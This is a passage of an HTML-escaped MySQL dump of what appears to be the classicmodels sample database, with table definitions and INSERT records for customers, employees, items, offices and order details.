\u0026amp; Co.\u0026#39;, \u0026#39;Moos\u0026#39;, \u0026#39;Hanna \u0026#39;, \u0026#39;0621-08555\u0026#39;, \u0026#39;Forsterstr. 57\u0026#39;, null, \u0026#39;Mannheim\u0026#39;, null, \u0026#39;68306\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;480\u0026#39;, \u0026#39;Kremlin Collectables, Co.\u0026#39;, \u0026#39;Semenov\u0026#39;, \u0026#39;Alexander \u0026#39;, \u0026#39;+7 812 293 0521\u0026#39;, \u0026#39;2 Pobedy Square\u0026#39;, null, \u0026#39;Saint Petersburg\u0026#39;, null, \u0026#39;196143\u0026#39;, \u0026#39;Russia\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;481\u0026#39;, \u0026#39;Raanan Stores, Inc\u0026#39;, \u0026#39;Altagar,G M\u0026#39;, \u0026#39;Raanan\u0026#39;, \u0026#39;+ 972 9 959 8555\u0026#39;, \u0026#39;3 Hagalim Blv.\u0026#39;, null, \u0026#39;Herzlia\u0026#39;, null, \u0026#39;47625\u0026#39;, \u0026#39;Israel\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;484\u0026#39;, \u0026#39;Iberia Gift Imports, Corp.\u0026#39;, \u0026#39;Roel\u0026#39;, \u0026#39;JosPedro \u0026#39;, \u0026#39;(95) 555 82 82\u0026#39;, \u0026#39;C/ Romero, 33\u0026#39;, null, \u0026#39;Sevilla\u0026#39;, null, \u0026#39;41101\u0026#39;, \u0026#39;Spain\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;65700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;486\u0026#39;, \u0026#39;Motor Mint Distributors Inc.\u0026#39;, \u0026#39;Salazar\u0026#39;, \u0026#39;Rosa\u0026#39;, \u0026#39;2155559857\u0026#39;, \u0026#39;11328 Douglas Av.\u0026#39;, null, \u0026#39;Philadelphia\u0026#39;, \u0026#39;PA\u0026#39;, \u0026#39;71270\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;72600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;487\u0026#39;, \u0026#39;Signal Collectibles Ltd.\u0026#39;, \u0026#39;Taylor\u0026#39;, \u0026#39;Sue\u0026#39;, \u0026#39;4155554312\u0026#39;, \u0026#39;2793 Furth Circle\u0026#39;, null, \u0026#39;Brisbane\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;60300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;489\u0026#39;, \u0026#39;Double Decker Gift Stores, Ltd\u0026#39;, \u0026#39;Smith\u0026#39;, \u0026#39;Thomas \u0026#39;, \u0026#39;(171) 555-7555\u0026#39;, \u0026#39;120 Hanover Sq.\u0026#39;, null, \u0026#39;London\u0026#39;, null, \u0026#39;WA1 1DP\u0026#39;, \u0026#39;UK\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;43300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;495\u0026#39;, \u0026#39;Diecast Collectables\u0026#39;, \u0026#39;Franco\u0026#39;, \u0026#39;Valarie\u0026#39;, \u0026#39;6175552555\u0026#39;, \u0026#39;6251 Ingle Ln.\u0026#39;, null, \u0026#39;Boston\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;51003\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;85100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;496\u0026#39;, \u0026#39;Kelly\\\u0026#39;s Gift Shop\u0026#39;, \u0026#39;Snowden\u0026#39;, \u0026#39;Tony\u0026#39;, \u0026#39;+64 9 5555500\u0026#39;, \u0026#39;Arenales 1938 3\\\u0026#39;A\\\u0026#39;\u0026#39;, null, \u0026#39;Auckland \u0026#39;, null, null, \u0026#39;New Zealand\u0026#39;, \u0026#39;1612\u0026#39;, \u0026#39;110000.00\u0026#39;); -- ---------------------------- -- Table structure for `employees` -- ---------------------------- DROP TABLE IF EXISTS `employees`; CREATE TABLE `employees` ( `employeeNumber` int(11) NOT NULL, `lastName` varchar(50) NOT NULL, `firstName` varchar(50) NOT NULL, `extension` varchar(10) NOT NULL, `email` varchar(100) NOT NULL, `officeCode` varchar(10) NOT NULL, `reportsTo` int(11) DEFAULT NULL, `jobTitle` varchar(50) NOT NULL, PRIMARY KEY (`employeeNumber`), KEY `reportsTo` (`reportsTo`), KEY `officeCode` (`officeCode`), CONSTRAINT `employees_ibfk_1` FOREIGN KEY (`reportsTo`) REFERENCES `employees` (`employeeNumber`), CONSTRAINT `employees_ibfk_2` FOREIGN KEY (`officeCode`) REFERENCES `offices` (`officeCode`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of employees -- ---------------------------- INSERT INTO `employees` VALUES (\u0026#39;1002\u0026#39;, \u0026#39;Murphy\u0026#39;, \u0026#39;Diane\u0026#39;, \u0026#39;x5800\u0026#39;, \u0026#39;dmurphy@yiibai.com\u0026#39;, \u0026#39;1\u0026#39;, null, \u0026#39;President\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1056\u0026#39;, \u0026#39;Patterson\u0026#39;, \u0026#39;Mary\u0026#39;, \u0026#39;x4611\u0026#39;, \u0026#39;mpatterso@yiibai.com\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1002\u0026#39;, \u0026#39;VP Sales\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1076\u0026#39;, \u0026#39;Firrelli\u0026#39;, \u0026#39;Jeff\u0026#39;, \u0026#39;x9273\u0026#39;, \u0026#39;jfirrelli@yiibai.com\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1002\u0026#39;, \u0026#39;VP Marketing\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1088\u0026#39;, \u0026#39;Patterson\u0026#39;, \u0026#39;William\u0026#39;, \u0026#39;x4871\u0026#39;, \u0026#39;wpatterson@yiibai.com\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;1056\u0026#39;, \u0026#39;Sales Manager (APAC)\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1102\u0026#39;, \u0026#39;Bondur\u0026#39;, \u0026#39;Gerard\u0026#39;, \u0026#39;x5408\u0026#39;, \u0026#39;gbondur@gmail.com\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;1056\u0026#39;, \u0026#39;Sale Manager (EMEA)\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1143\u0026#39;, \u0026#39;Bow\u0026#39;, \u0026#39;Anthony\u0026#39;, \u0026#39;x5428\u0026#39;, \u0026#39;abow@gmail.com\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1056\u0026#39;, \u0026#39;Sales Manager (NA)\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1165\u0026#39;, \u0026#39;Jennings\u0026#39;, \u0026#39;Leslie\u0026#39;, \u0026#39;x3291\u0026#39;, \u0026#39;ljennings@yiibai.com\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1166\u0026#39;, \u0026#39;Thompson\u0026#39;, \u0026#39;Leslie\u0026#39;, \u0026#39;x4065\u0026#39;, \u0026#39;lthompson@yiibai.com\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1188\u0026#39;, \u0026#39;Firrelli\u0026#39;, \u0026#39;Julie\u0026#39;, \u0026#39;x2173\u0026#39;, \u0026#39;jfirrelli@yiibai.com\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1216\u0026#39;, \u0026#39;Patterson\u0026#39;, \u0026#39;Steve\u0026#39;, \u0026#39;x4334\u0026#39;, \u0026#39;spatterson@yiibai.com\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1286\u0026#39;, \u0026#39;Tseng\u0026#39;, \u0026#39;Foon Yue\u0026#39;, \u0026#39;x2248\u0026#39;, \u0026#39;ftseng@yiibai.com\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1323\u0026#39;, \u0026#39;Vanauf\u0026#39;, \u0026#39;George\u0026#39;, \u0026#39;x4102\u0026#39;, \u0026#39;gvanauf@yiibai.com\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1143\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1337\u0026#39;, \u0026#39;Bondur\u0026#39;, \u0026#39;Loui\u0026#39;, \u0026#39;x6493\u0026#39;, \u0026#39;lbondur@yiibai.com\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1370\u0026#39;, \u0026#39;Hernandez\u0026#39;, \u0026#39;Gerard\u0026#39;, \u0026#39;x2028\u0026#39;, \u0026#39;ghernande@gmail.com\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1401\u0026#39;, \u0026#39;Castillo\u0026#39;, \u0026#39;Pamela\u0026#39;, \u0026#39;x2759\u0026#39;, \u0026#39;pcastillo@gmail.com\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1501\u0026#39;, \u0026#39;Bott\u0026#39;, \u0026#39;Larry\u0026#39;, \u0026#39;x2311\u0026#39;, \u0026#39;lbott@yiibai.com\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1504\u0026#39;, \u0026#39;Jones\u0026#39;, \u0026#39;Barry\u0026#39;, \u0026#39;x102\u0026#39;, \u0026#39;bjones@gmail.com\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1611\u0026#39;, \u0026#39;Fixter\u0026#39;, \u0026#39;Andy\u0026#39;, \u0026#39;x101\u0026#39;, \u0026#39;afixter@yiibai.com\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;1088\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1612\u0026#39;, \u0026#39;Marsh\u0026#39;, \u0026#39;Peter\u0026#39;, \u0026#39;x102\u0026#39;, \u0026#39;pmarsh@yiibai.com\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;1088\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1619\u0026#39;, \u0026#39;King\u0026#39;, \u0026#39;Tom\u0026#39;, \u0026#39;x103\u0026#39;, \u0026#39;tking@gmail.com\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;1088\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1621\u0026#39;, \u0026#39;Nishi\u0026#39;, \u0026#39;Mami\u0026#39;, \u0026#39;x101\u0026#39;, \u0026#39;mnishi@gmail.com\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;1056\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1625\u0026#39;, \u0026#39;Kato\u0026#39;, \u0026#39;Yoshimi\u0026#39;, \u0026#39;x102\u0026#39;, \u0026#39;ykato@gmail.com\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;Sales Rep\u0026#39;); INSERT INTO `employees` VALUES (\u0026#39;1702\u0026#39;, \u0026#39;Gerard\u0026#39;, \u0026#39;Martin\u0026#39;, \u0026#39;x2312\u0026#39;, \u0026#39;mgerard@gmail.com\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;1102\u0026#39;, \u0026#39;Sales Rep\u0026#39;); -- ---------------------------- -- Table structure for `items` -- ---------------------------- DROP TABLE IF EXISTS `items`; CREATE TABLE `items` ( `id` int(11) NOT NULL AUTO_INCREMENT, `item_no` varchar(255) NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of items -- ---------------------------- INSERT INTO `items` VALUES (\u0026#39;1\u0026#39;, \u0026#39;A-1\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;2\u0026#39;, \u0026#39;A-2\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;3\u0026#39;, \u0026#39;A-3\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;4\u0026#39;, \u0026#39;A-4\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;5\u0026#39;, \u0026#39;A-5\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;6\u0026#39;, \u0026#39;A-10\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;7\u0026#39;, \u0026#39;A-11\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;8\u0026#39;, \u0026#39;A-20\u0026#39;); INSERT INTO `items` VALUES (\u0026#39;9\u0026#39;, \u0026#39;A-30\u0026#39;); -- ---------------------------- -- Table structure for `offices` -- ---------------------------- DROP TABLE IF EXISTS `offices`; CREATE TABLE `offices` ( `officeCode` varchar(10) NOT NULL, `city` varchar(50) NOT NULL, `phone` varchar(50) NOT NULL, `addressLine1` varchar(50) NOT NULL, `addressLine2` varchar(50) DEFAULT NULL, `state` varchar(50) DEFAULT NULL, `country` varchar(50) NOT NULL, `postalCode` varchar(15) NOT NULL, `territory` varchar(10) NOT NULL, PRIMARY KEY (`officeCode`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of offices -- ---------------------------- INSERT INTO `offices` VALUES (\u0026#39;1\u0026#39;, \u0026#39;San Francisco\u0026#39;, \u0026#39;+1 650 219 4782\u0026#39;, \u0026#39;100 Market Street\u0026#39;, \u0026#39;Suite 300\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;94080\u0026#39;, \u0026#39;NA\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;2\u0026#39;, \u0026#39;Boston\u0026#39;, \u0026#39;+1 215 837 0825\u0026#39;, \u0026#39;1550 Court Place\u0026#39;, \u0026#39;Suite 102\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;02107\u0026#39;, \u0026#39;NA\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;3\u0026#39;, \u0026#39;NYC\u0026#39;, \u0026#39;+1 212 555 3000\u0026#39;, \u0026#39;523 East 53rd Street\u0026#39;, \u0026#39;apt. 5A\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;NA\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;4\u0026#39;, \u0026#39;Paris\u0026#39;, \u0026#39;+33 14 723 4404\u0026#39;, \u0026#39;43 Rue Jouffroy D\\\u0026#39;abbans\u0026#39;, null, null, \u0026#39;France\u0026#39;, \u0026#39;75017\u0026#39;, \u0026#39;EMEA\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;5\u0026#39;, \u0026#39;Beijing\u0026#39;, \u0026#39;+86 33 224 5000\u0026#39;, \u0026#39;4-1 Haidian Area\u0026#39;, null, \u0026#39;BJ\u0026#39;, \u0026#39;China\u0026#39;, \u0026#39;110000\u0026#39;, \u0026#39;NA\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;6\u0026#39;, \u0026#39;Sydney\u0026#39;, \u0026#39;+61 2 9264 2451\u0026#39;, \u0026#39;5-11 Wentworth Avenue\u0026#39;, \u0026#39;Floor #2\u0026#39;, null, \u0026#39;Australia\u0026#39;, \u0026#39;NSW 2010\u0026#39;, \u0026#39;APAC\u0026#39;); INSERT INTO `offices` VALUES (\u0026#39;7\u0026#39;, \u0026#39;London\u0026#39;, \u0026#39;+44 20 7877 2041\u0026#39;, \u0026#39;25 Old Broad Street\u0026#39;, \u0026#39;Level 7\u0026#39;, null, \u0026#39;UK\u0026#39;, \u0026#39;EC2N 1HN\u0026#39;, \u0026#39;EMEA\u0026#39;); -- ---------------------------- -- Table structure for `orderdetails` -- ---------------------------- DROP TABLE IF EXISTS `orderdetails`; CREATE TABLE `orderdetails` ( `orderNumber` int(11) NOT NULL, `productCode` varchar(15) NOT NULL, `quantityOrdered` int(11) NOT NULL, `priceEach` decimal(10,2) NOT NULL, `orderLineNumber` smallint(6) NOT NULL, PRIMARY KEY (`orderNumber`,`productCode`), KEY `productCode` (`productCode`), CONSTRAINT `orderdetails_ibfk_1` FOREIGN KEY (`orderNumber`) REFERENCES `orders` (`orderNumber`), CONSTRAINT `orderdetails_ibfk_2` FOREIGN KEY (`productCode`) REFERENCES `products` (`productCode`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of orderdetails -- ---------------------------- INSERT INTO `orderdetails` VALUES (\u0026#39;10100\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;136.00\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10100\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;55.09\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10100\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;75.46\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10100\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;35.29\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10101\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;108.06\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10101\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;167.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10101\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;32.53\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10101\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;44.35\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10102\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;95.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10102\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;43.13\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;214.30\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;119.67\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;121.64\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;94.50\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;58.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;92.19\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;61.84\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;86.92\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;86.31\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;98.07\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;40.75\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;107.34\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;88.62\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;92.46\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;63.35\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10103\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;94.07\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;131.44\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;111.39\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;135.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;122.73\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;165.95\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;119.20\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;52.02\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;30.41\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;106.45\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;51.95\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;56.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;114.59\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10104\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;53.31\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;127.84\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;205.72\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;141.88\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;136.59\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;87.73\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;75.48\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;117.97\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;73.46\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;75.47\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;54.00\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;86.61\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;60.72\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;92.16\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;99.31\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10105\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;44.77\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;134.04\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;81.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;80.86\u0026#39;, \u0026#39;18\u0026#39;); 